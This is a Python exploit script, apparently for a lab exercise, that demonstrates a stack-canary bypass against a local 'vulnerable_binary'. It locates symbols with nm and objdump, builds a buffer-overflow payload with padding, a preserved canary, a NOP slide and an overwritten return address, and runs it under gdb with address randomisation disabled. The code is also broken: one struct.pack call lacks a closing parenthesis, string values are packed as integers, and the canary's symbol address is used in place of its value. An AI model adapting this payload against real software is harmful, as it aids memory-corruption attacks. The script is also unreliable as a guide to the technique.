import subprocess
import os
import struct
import re

BINARY_PATH = "./vulnerable_binary"

def analyze_binary(binary_path):
    """Analyze the binary to extract memory layout information using nm and objdump."""
    try:
        nm_output = subprocess.check_output(['nm', binary_path]).decode()
        objdump_output = subprocess.check_output(['objdump', '-d', binary_path]).decode()

        canary_address = re.search(r'(\w+) B canary', nm_output)
        buffer_address = re.search(r'(\w+) <vulnerable_function>:', objdump_output)
        deadcode_address = re.search(r'(\w+) <deadcode>:', objdump_output)

        return canary_address.group(1), buffer_address.group(1), deadcode_address.group(1)
    except subprocess.CalledProcessError as e:
        print(f"Failed to analyze binary: {e}")
        exit(1)  #if binary cannot be analyzed

def create_dynamic_payload(canary, deadcode_address):
    """Create a dynamic payload to jump to deadcode, bypassing the canary."""
    buffer_size = 64
    nop_slide = b"\x90" * 16
    payload = b"A" * buffer_size
    payload += struct.pack("<I", canary)  # preserving the canary
    payload += nop_slide
    payload += struct.pack("<I", (deadcode_address)  # jumping to return address
    return payload

def gdb_auto_run(binary_path, payload):
    """Automatically run gdb with the given payload."""
    gdb_commands = """
    set logging enabled on
    set pagination off
    set disable-randomization on
    break vulnerable_function
    commands
        print 'Memory Layout at Breakpoint:\n'
        x/24wx $esp
        info registers
    end
    run
    printf "Checking for deadcode execution...\n"
    continue
    printf "Exploit Test Complete\n"
    """
    gdb_script = "gdb_script.gdb"
    with open(gdb_script, "w") as f:
        f.write(gdb_commands)

    gdb_process = subprocess.Popen(['gdb', '-x', gdb_script, binary_path], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    gdb_process.communicate(input=payload)
    gdb_process.wait()
    print("GDB session has completed. Check gdb_script.gdb for details.")

def main():
    print("Starting Stack Canary Bypass demonstration...")
    try:
        canary, _, deadcode_address = analyze_binary(BINARY_PATH)
        payload = create_dynamic_payload(canary, deadcode_address)
        gdb_auto_run(BINARY_PATH, payload)
        print("Exploit attempt completed. Check GDB output for details.")
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    main()
